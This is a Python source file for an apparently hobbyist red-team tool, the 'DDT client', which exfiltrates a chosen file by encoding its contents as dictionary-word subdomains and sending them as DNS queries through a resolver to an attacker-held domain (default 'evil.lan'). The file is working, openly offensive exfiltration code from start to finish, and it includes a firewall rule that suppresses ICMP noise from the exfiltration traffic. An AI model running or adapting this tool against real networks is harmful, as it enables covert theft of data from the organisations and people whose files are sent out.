from __future__ import print_function

import collections
import argparse
import logging
import time
import re
import sys
import string
from scapy.all import *

if __name__ == '__main__':

	print("""
  ___  ___ _____ 
 |   \|   \_   _|
 | |) | |) || |  
 |___/|___/ |_|  client v2.0 (by th3r3g3nt)
 Dictionary-based Data Transfer (via DNS)
 
 Definitely not good for your environment...""")

	p = argparse.ArgumentParser(description="DDT Client v2.0")
	
	p.add_argument("--data", default="target.txt",
		metavar="<data>",
		help = "The file to exfiltrate Default: target.txt)")

	p.add_argument("--dictionary", default="dict.txt",
		metavar="<word-dictionary>",
		help="The custom-word dictionary lookup for the DNS names. Default: dict.txt; MUST match on client & server.")

	p.add_argument("--domain", default="evil.lan",
		metavar="<domain>",
		help = "The exfiltration domain, which you are the SOA. Default: evil.lan")

	p.add_argument("--dnsserver", default="8.8.8.8",
		metavar="<dnsserver>",
		help = "The internal DNS server address. Default: 8.8.8.8 which probably not what you want")

	p.add_argument("--port","-p",type=int,default=53,
		metavar="<port>",
		help="Server port. Default:53)")

	p.add_argument("--tcp",action='store_true',default=False,
		help="TCP server. Default: UDP only; THIS OPTIONS IS NOT YET LIVE")

	p.add_argument("--separator", "-s", default=":@@SEP@@:",
		metavar="<separator>",
		help="The dictionary file must have a exfildata<separator>subdomain structure. Default separator is :@@SEP@@:")

	p.add_argument("--verbose",action='store_true',default=False,
		help="Enable verbose output on the screen")

	p.add_argument("--fwokay", action='store_true', default=False,
		help="The local firewall was updated to prevent ICMP Unreachable messages to go out. (I've used this tool before)")
	
	args = p.parse_args()

	if args.verbose:
		logging.basicConfig(level=logging.INFO)


	if not args.fwokay:
		print ("""
 ** Have you added ? ** an ICMP drop rule to your local firewall to prevent extra traffic generated by the kernel?
 This is becasue Scapy does not inform the kernel about the communication; and all of a sudden there is a DNS
 reply - triggering ICMP Unreachable because of the unexpected traffic.
 For future cases, you can add the --fwokay parameter to avoid being annoyed by this question.
""")

		print (" iptables -A INPUT -s " + args.dnsserver + " -j DROP")

		#Not the most elegant, please send pull request to make this nicer. No complaints are accepted...
		reply = str(raw_input("\n\n Is iptables settings were manually adjusted before running this tool? (y/n): ")).lower().strip()
		if reply[0] == 'y': 
			pass

		elif reply[0] == 'n':
			print(" ** Exiting ** ; Please come back after iptables are fixed")
			exit(1)
		else:
			print(" ** Exiting ** ; Please come back after the user and the iptables are fixed")
			exit(1)


	# Create the DNS table for translation
	dict = {}

	logging.info('Adding magic values to the dictionary')
	# Manual special values
	dict["\n"] = "feed-n"
	dict["\r\n"] = "feed-rn"
	dict["\t"] = "tab"
	dict["\0"] = "final"

	try:
		with open(args.dictionary, "r") as dict_file:
			logging.info('Using '+args.dictionary+' as the dictionary file')
			for line in dict_file:
				name, var = line.partition(args.separator)[::2]
				if name in dict:
					print ("Duplicate subdomain. Skipping")
				else:
					dict[name] = str(var.strip())
					logging.info('Dictionary entry created as dict[' + str(name) + '] = ' + str(var.strip()) )

		# Creating the reverse dictionary - mainly convenience
		rev_dict = {v: k for k, v in dict.items()}

	except:
		print ("\n[E] Cannot open dictionary file " + args.dictionary + "\nPlease provide a valid dictionary file!\n")
		exit(1)


	try:
		with open(args.data, "r") as exfil_file:
			data = exfil_file.read()
		logging.info('Will exfiltrate ' + args.data + ' file')
	except:
		print ("\n[E] Cannot open the file " + args.data + " for exfiltration.\nPlease provide a valid data this!\n")
		exit(1)


	# Create the most compact DNS subdomains, given that there is a regex match in the dictionary
	# print("WARNING! Need to implement dictionary health-check!")
	pattern = re.compile('|'.join(re.escape(key) for key in dict.keys()))
	ddt_results = pattern.sub(lambda x: dict[x.group()]+"\n", data)
	ddt_results = ddt_results.split()

	print ("The original data would be " + str(len(data)) + " queries, if extracted by single bytes")
	print ("With DDT, we are expecting " + str(len(ddt_results)) + " queries")
	print(str(100- int((100 * float(len(ddt_results))/float(len(data)))))+"% traffic saved")

	frag_counter = 0

	for i in ddt_results:
		try:
#			if (i in dict.values()):
				#
#				print("Created valid fragment as " + i + "." + args.domain + " \twhich is\t " + rev_dict[i])

			# Send them packets awaaaay
			packet = sr1(IP(dst=args.dnsserver)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=i + "." + args.domain )),timeout=5, retry=0, verbose=False)
			logging.info(" Sent a valid fragment as " + i + "." + args.domain + " \twhich is\t " + rev_dict[i])

			if packet is None:
				print (" ** We did not received answers to our query. This may mean that packets are lost. Next version prolly have recovery, but now, I'll just die here...")
				exit(1)

			time.sleep(0.5)

			frag_counter += 1
			if frag_counter % 10 == 0:
				print ("Sent",str(frag_counter),"fragments out of",str(len(ddt_results)))

		except:
			print ("[E] Cannot create frag; No dictionary match for " + i)


	print ("Sending final EOF magic word...")
	final_packet = sr1(IP(dst=args.dnsserver)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname="final" + "." + args.domain )),timeout=1, retry=0, verbose=False)
	print (" ** Thanks for playing! **")
	print (" ** Root for everyone! **")
	exit(0)